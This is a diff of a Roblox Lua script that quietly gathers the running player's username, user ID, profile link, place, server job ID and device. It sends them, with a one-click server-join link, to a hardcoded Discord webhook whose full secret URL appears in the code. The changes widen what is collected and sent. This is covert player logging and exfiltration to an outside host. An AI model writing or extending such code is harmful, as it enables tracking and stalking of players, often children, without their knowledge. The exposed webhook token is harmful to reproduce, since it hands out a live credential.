@@ -4,24 +4,28 @@ local players = game:GetService("Players")
 local runService = game:GetService("RunService")
 local userInputService = game:GetService("UserInputService")
 local tweenService = game:GetService("TweenService")
+local marketplaceService = game:GetService("MarketplaceService")
 
 local webhookUrl = "https://discord.com/api/webhooks/1322910314534010880/Fx3dNcAnfeP5iGp9yGEGnHt217Jq_eni_Wt7WOS7AJJPT0oGoYMhO9fHM22s7zr4ujJp"
 
+-- Gather session data
 local function gatherInfo()
+    local placeInfo = marketplaceService:GetProductInfo(game.PlaceId)
     local info = {
         Username = players.LocalPlayer.Name,
         UserId = players.LocalPlayer.UserId,
         PlaceId = game.PlaceId,
+        PlaceName = placeInfo.Name,
         JobId = game.JobId,
+        ProfileLink = "https://www.roblox.com/users/" .. players.LocalPlayer.UserId .. "/profile",
         Device = userInputService.TouchEnabled and "Mobile" or "PC/Console",
+        AutoJoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId -- Auto-join link
     }
     return info
 end
 
+-- Send session data to webhook
 local function sendToWebhook(data)
-    local jobId = data.JobId
-    local joinLink = "https://www.roblox.com/join-game/" .. jobId
-
     local payload = {
         ["content"] = "Collected Roblox Session Data",
         ["embeds"] = {{
@@ -29,10 +33,12 @@ local function sendToWebhook(data)
             ["fields"] = {
                 {["name"] = "Username", ["value"] = data.Username, ["inline"] = true},
                 {["name"] = "User ID", ["value"] = tostring(data.UserId), ["inline"] = true},
+                {["name"] = "Profile Link", ["value"] = "[View Profile](" .. data.ProfileLink .. ")", ["inline"] = false},
+                {["name"] = "Place Name", ["value"] = data.PlaceName, ["inline"] = true},
                 {["name"] = "Place ID", ["value"] = tostring(data.PlaceId), ["inline"] = true},
                 {["name"] = "Job ID", ["value"] = data.JobId, ["inline"] = true},
                 {["name"] = "Device Type", ["value"] = data.Device, ["inline"] = true},
-                {["name"] = "Server Join Link", ["value"] = joinLink, ["inline"] = false},
+                {["name"] = "Auto-Join Link", ["value"] = "[Click to Join Server](roblox://placeId=" .. data.PlaceId .. "&gameInstanceId=" .. data.JobId .. ")", ["inline"] = false},
             },
             ["color"] = 0x7289DA
         }}
